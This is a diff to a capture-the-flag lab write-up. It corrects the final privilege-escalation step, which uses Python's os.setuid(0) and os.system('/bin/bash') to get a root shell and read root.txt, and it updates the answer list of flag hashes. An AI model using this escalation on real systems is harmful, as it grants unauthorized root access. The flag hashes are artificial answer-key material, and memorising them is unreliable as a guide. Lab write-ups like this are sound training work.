@@ -110,13 +110,15 @@ os.setuid(0)
 os.system("/bin/bash")
 id
 ls
-cat user.txt
+cd /root
+cat root.txt
 ```
-Running the *id* command confirms I am root user while being in the same group as nathan.
-Running the *ls* command shows the contents of the directory.
-Running the *cat* command displays the contents of *user.txt* which is our flag.
+- Running the *id* command confirms I am root user while being in the same group as nathan.
+- Running the *ls* command shows the contents of the directory.
+- Running the *cd /root* command changes to *root* directory.
+- Running the *cat* command displays the contents of *root.txt* which is our flag.
 
-![Image](https://github.com/user-attachments/assets/0caffed6-731e-4da0-8fc3-ce0bfebdfd17)
+![Image](https://github.com/user-attachments/assets/18bcfecd-d743-44d2-8429-371f1afb1ece)
 
 **Answers: <br>**
 A) 3 <br>
@@ -126,4 +128,4 @@ A) data
 <br> A) ssh
 <br> A) c60cbb44471f2d34a45ae669310afa06
 <br> A) /usr/bin/python3.8
-<br> A) c60cbb44471f2d34a45ae669310afa06
+<br> A) 12686e0eaa5cf8d5c11fcaff70e54362
